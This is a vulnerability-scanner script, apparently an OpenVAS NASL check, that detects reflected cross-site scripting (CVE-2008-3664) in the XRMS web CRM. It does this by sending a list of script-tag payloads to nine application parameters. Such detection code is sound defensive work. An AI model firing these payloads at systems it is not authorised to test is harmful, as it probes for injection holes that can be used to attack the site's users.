if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.101008" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-03-15 21:44:50 +0100 (Sun, 15 Mar 2009)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_cve_id( "CVE-2008-3664" );
	script_name( "Multiple Cross Site Scripting and SQL Injection vulnerabilities in XRMS" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2009 Christian Eric Edjenguele <christian.edjenguele@owasp.org>" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
  to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "XRMS is a web-based application for managing business entities such as
  employees, customers, contacts, activities.

  The application is vulnerable to simple Cross Site Scripting, which can
  be used for several isues." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
pages = make_list( "/login.php?target=test<script>alert('attack');</script>",
	 "/activities/some.php?title=test<script>alert('attack');</script>",
	 "/companies/some.php?company_name=test<script>alert('attack');</script>",
	 "/contacts/some.php?last_name=test<script>alert('attack');</script>",
	 "/campaigns/some.php?campaign_title=test<script>alert('attack');</script>",
	 "/opportunities/some.php?opportunity_title=test<script>alert('attack');</script>",
	 "/cases/some.php?case_title=test<script>alert('attack');</script>",
	 "/files/some.php?file_id=test<script>alert('attack');</script>",
	 "/reports/custom/mileage.php?starting=test<script>alert('attack');</script>" );
for dir in nasl_make_list_unique( "/", "/xrms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/login.php";
	buf = http_get_cache( item: url, port: port );
	if(!buf || !IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" )){
		continue;
	}
	if(!ContainsString( buf, "<title>XRMS : XRMS</title>" ) && !ContainsString( buf, "<div id=\"page_header\">XRMS</div>" ) && !ContainsString( buf, "href=\"http://sourceforge.net/projects/xrms/\">" )){
		continue;
	}
	for php in pages {
		url = dir + php;
		if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\('attack'\\);</script>", extra_check: "test", check_header: TRUE )){
			report = http_report_vuln_url( url: url, port: port );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

